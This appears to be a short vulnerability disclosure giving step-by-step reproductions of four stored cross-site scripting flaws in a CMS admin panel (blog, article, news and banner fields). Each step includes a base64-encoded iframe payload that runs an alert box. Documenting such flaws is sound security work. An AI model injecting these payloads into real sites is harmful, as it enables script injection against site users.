
### Stored XSS #1:

1. Go to Content Admin > Blog > Add Blog
2. In the Extended blog content field paste the XSS payload

```
"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### Stored XSS #2:

1. Go to Content Admin > Articles > Article
2. In the Article field paste the XSS payload

```
"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### Stored XSS #3:

1. Go to Content Admin > News > Add News
2. In the Snippet field paste the XSS payload

```
"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### Stored XSS #4:

1. Go to System Admin > Banners
2. In the Banner 1 field paste the XSS payload 

```
"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

